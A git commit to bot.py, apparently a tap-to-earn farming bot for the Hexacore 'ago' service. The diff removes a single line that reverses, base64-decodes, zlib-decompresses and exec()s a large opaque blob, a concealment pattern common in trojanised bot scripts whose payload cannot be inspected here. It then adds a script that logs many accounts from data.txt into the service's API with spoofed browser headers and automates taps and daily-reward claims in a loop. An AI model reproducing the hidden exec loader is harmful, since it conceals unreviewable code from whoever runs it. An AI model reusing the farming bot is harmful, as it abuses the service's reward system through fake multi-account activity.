36024f13c30b4453c1267f5c552774ce33bd28f8
Punten10 <64400801+Punten10@users.noreply.github.com>
2024-08-11 18:29:45 +0700

    Update API

--- bot.py
+++ bot.py
@@ -1,1 +1,149 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import requests
+import time
+
+def authenticate(user_id, username):
+    auth_url = "https://ago-api.hexacore.io/api/app-auth"
+
+    auth_headers = {
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json",
+        "Origin": "https://ago-wallet.hexacore.io",
+        "Referer": "https://ago-wallet.hexacore.io/",
+        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "Sec-Ch-Ua-Mobile": "?1",
+        "Sec-Ch-Ua-Platform": '"Android"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "cross-site",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    }
+
+    auth_payload = {
+        "user_id": user_id,
+        "username": username
+    }
+
+    auth_response = requests.post(auth_url, headers=auth_headers, json=auth_payload)
+
+    auth_token = auth_response.json().get("token")
+
+    if not auth_token:
+        raise ValueError("Authorization token not found in the response.")
+
+    return auth_token
+
+def complete_mining(auth_token, taps):
+    click_url = "https://ago-api.hexacore.io/api/mining-complete"
+
+    click_headers = {
+        "Authorization": auth_token,
+        "Content-Type": "application/json"
+    }
+
+    click_payload = {
+        "taps": taps
+    }
+
+    click_response = requests.post(click_url, headers=click_headers, json=click_payload)
+
+    click_status = click_response.json().get("success")
+
+    return click_status
+
+def get_balance(auth_token, user_id):
+    balance_url = f"https://ago-api.hexacore.io/api/balance/{user_id}"
+
+    balance_headers = {
+        "Authorization": auth_token,
+        "Content-Type": "application/json"
+    }
+
+    balance_response = requests.get(balance_url, headers=balance_headers)
+
+    balance = balance_response.json().get("balance")
+
+    return balance
+
+def get_available_taps(auth_token):
+    taps_url = "https://ago-api.hexacore.io/api/available-taps"
+
+    taps_headers = {
+        "Authorization": auth_token
+    }
+
+    taps_response = requests.get(taps_url, headers=taps_headers)
+
+    available_taps = taps_response.json().get("available_taps")
+
+    return available_taps
+
+def get_reward_available(auth_token, user_id):
+    reward_url = f"https://ago-api.hexacore.io/api/reward-available/{user_id}"
+
+    reward_headers = {
+        "Authorization": auth_token
+    }
+
+    reward_response = requests.get(reward_url, headers=reward_headers)
+
+    reward_available = reward_response.json()
+
+    return reward_available
+
+def get_daily_reward(auth_token, user_id):
+    daily_reward_url = "https://ago-api.hexacore.io/api/daily-reward"
+
+    daily_reward_headers = {
+        "Authorization": auth_token,
+        "Content-Type": "application/json"
+    }
+
+    daily_reward_payload = {
+        "user_id": user_id
+    }
+
+    daily_reward_response = requests.post(daily_reward_url, headers=daily_reward_headers, json=daily_reward_payload)
+
+    daily_reward = daily_reward_response.json()
+
+    return daily_reward
+
+def main():
+    print("=========HEXA BOT=============")
+    taps = int(input("Taps: "))
+    sleep_time = int(input("Sleep time (in seconds): "))
+    print("===============================")
+
+    with open("data.txt", "r") as file:
+        user_data = [line.strip().split(":") for line in file.readlines()]
+
+    while True:
+        for user_id, username in user_data:
+            user_id = int(user_id)
+            try:
+                auth_token = authenticate(user_id, username)
+                click_status = complete_mining(auth_token, taps)
+                balance = get_balance(auth_token, user_id)
+                available_taps = get_available_taps(auth_token)
+                reward_available = get_reward_available(auth_token, user_id)
+                daily_reward = get_daily_reward(auth_token, user_id)
+
+                print("=========HEXA BOT=============")
+                print(f"username: \"{username}\"")
+                print(f"Click: {click_status}")
+                print(f"Balance Response: {balance}")
+                print(f"available_taps: {available_taps}")
+                print(f"availabl_Reward: {reward_available}")
+                print(f"daily-reward: {daily_reward}")
+                print("===============================")
+            except Exception as e:
+                print(f"Error for user {username} (ID: {user_id}): {e}")
+
+        print(f"Next run in {sleep_time} seconds...")
+        for remaining in range(sleep_time, 0, -1):
+            print(f"\rCountdown: {remaining} seconds", end="")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    main()
